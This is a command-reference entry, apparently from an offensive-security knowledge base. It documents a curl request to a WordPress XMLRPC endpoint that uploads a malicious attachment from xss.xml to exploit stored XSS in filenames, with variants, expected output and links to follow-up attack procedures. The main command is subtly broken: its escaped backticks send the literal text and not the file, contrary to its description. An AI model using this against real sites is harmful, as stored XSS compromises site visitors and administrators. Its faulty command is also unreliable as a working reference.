---
id: e5f6g7h8-i9j0-1234-efgh-567890123456
data: >-
  curl 'https://wordpress.site/xmlrpc.php' --data-binary "\`cat xss.xml\`" -H
  'Content-type: application/xml'
tags:
  - xmlrpc
  - upload
  - xss
type: command
output: XML response with post ID or fault
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-13T23:52:20.937Z'
verified: false
validated: true
submitted: true
---
# curl-xmlrpc-post-attachment

## Command

```bash
curl 'https://wordpress.site/xmlrpc.php' --data-binary "\`cat xss.xml\`" -H 'Content-type: application/xml'
```

## Description

This command sends a POST request to WordPress XMLRPC endpoint to create a malicious attachment using the payload from xss.xml, exploiting stored XSS in filenames.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `'https://wordpress.site/xmlrpc.php'` | Target XMLRPC URL | Yes |
| `--data-binary "\`cat xss.xml\`"` | Reads and sends xss.xml as binary data (preserves newlines) | Yes |
| `-H 'Content-type: application/xml'` | Sets header for XML content | Yes |

## Examples

### Basic Usage

```bash
curl 'https://example.com/xmlrpc.php' --data-binary "@xss.xml" -H 'Content-type: application/xml'
```

### Advanced Usage

```bash
curl -v 'https://wordpress.site/xmlrpc.php' --data-binary "\`cat xss.xml\`" -H 'Content-type: application/xml' -u username:password
```

> Adds verbose (-v) and basic auth if needed.

## Expected Output

Successful: <?xml version="1.0"?><methodResponse><params><param><value><int>123</int></value></param></params></methodResponse> (post ID 123). Fault: <fault><value><struct><member><name>faultCode</name><value><int>403</int></value></member>...</struct></value></fault> (auth error).

## Related

- [[procedures/Prepare-XMLRPC-Payload-for-Malicious-Attachment]]
- [[procedures/Trigger-XSS-in-WordPress-Media-List]]
